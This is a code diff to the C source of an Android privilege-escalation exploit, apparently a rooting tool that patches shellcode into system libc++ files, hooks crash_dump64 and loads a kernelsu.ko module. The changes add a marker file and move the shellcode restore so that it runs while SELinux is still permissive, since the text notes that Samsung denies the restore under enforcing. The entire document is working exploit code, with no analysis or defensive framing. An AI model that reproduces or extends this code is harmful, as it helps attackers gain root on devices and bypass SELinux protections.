@@ -18,6 +18,7 @@
 #include "aes256.h"
 
 #define eos(s) (s + strlen(s))
+#define CXX_RESTORED "/data/user_de/0/df.root/cxx_restored"
 
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
@@ -390,6 +391,7 @@ static void cleanup(void) {
     printf("restoring shellcode in %s\n", g_libcxx_r.lib);
     patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
                    (size_t)g_libcxx_r.shell_off, 0);
+    g_libcxx_r.valid = 0;
 }
 
 int find_hook_target(const char *lib, const char *sym,
@@ -540,6 +542,10 @@ static int setup(int argc, char **argv) {
 static int exploit(void) {
     printf("\n=== exploit (patching files) ===\n");
 
+    /* Drop a stale cxx_restored - it would let bootstrap skip its wait.
+     * No race: bootstrap is only spawned later, by the hook. */
+    unlink(CXX_RESTORED);
+
     int rc = 3;
     if (patch_helper()) goto done;
     if (patch_ko()) goto done;
@@ -550,7 +556,7 @@ static int exploit(void) {
 
     rc = 2;
     usleep(500000);
-    
+
     printf("\n=== init  ===\n");
     createOrphanProcess();
 
@@ -583,6 +589,19 @@ static int exploit(void) {
                 printf("%s\n", markers[j].msg);
                 if (markers[j].rc >= 0) { rc = markers[j].rc; goto done; }
             }
+        }
+        /* dfm1 means bootstrap is running. Restore while still permissive:
+         * kernelsu.ko's init re-enforces SELinux, and Samsung denies the
+         * restore under enforcing. bootstrap waits for cxx_restored. */
+        if (g_libcxx_r.valid && access("/dev/dfm1", F_OK) == 0) {
+            cleanup();
+            /* The app cannot write /dev (DAC), so cxx_restored lives in its
+             * own data dir, which bootstrap already reads (prefs, ksud). */
+            int fd = open(CXX_RESTORED, O_CREAT | O_WRONLY, 0666);
+            if (fd < 0)
+                printf("libc++: ERROR - cannot create cxx_restored\n");
+            else
+                close(fd);
         }
     }
     printf("timeout: ERROR - check logcat & dmesg\n");
